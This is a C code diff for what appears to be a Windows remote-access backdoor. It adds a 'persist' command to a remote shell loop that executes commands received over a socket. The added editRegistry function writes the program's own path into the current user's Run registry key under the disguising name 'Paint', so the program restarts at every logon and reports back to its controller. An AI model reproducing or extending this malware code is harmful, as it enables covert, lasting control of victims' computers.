@@ -117,6 +117,36 @@ void runCmd(char cmd[1024], char (*container)[1024], char (*total_response)[1838
 	fclose(fp);
 }
 
+//============ Edit Registry for Persistance ============//
+int editRegistry() {
+	char err[] = "Failed\n";
+	char suc[] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+	TCHAR szPath[MAX_PATH]; // 260
+    HKEY NewVal;
+    DWORD pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
+    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+
+	if (pathLen == 0) {
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+
+	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+
+	if (RegSetValueEx(NewVal, TEXT("Paint"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+		RegCloseKey(NewVal);
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+
+	RegCloseKey(NewVal);
+	send(sock, suc, sizeof(suc), 0);
+	return 0;
+}
+
 //============ Shell ============//
 void Cmd() {
     char buffer[1024];
@@ -139,6 +169,8 @@ void Cmd() {
             // extract directory name leaving "cd "
             chdir(slice_str(buffer, 3, 100));
             runCmd("cd", &container, &total_response);
+        } else if (strncmp("persist", buffer, 7) == 0) {
+            editRegistry();
         }
         else {
             runCmd(buffer, &container, &total_response);
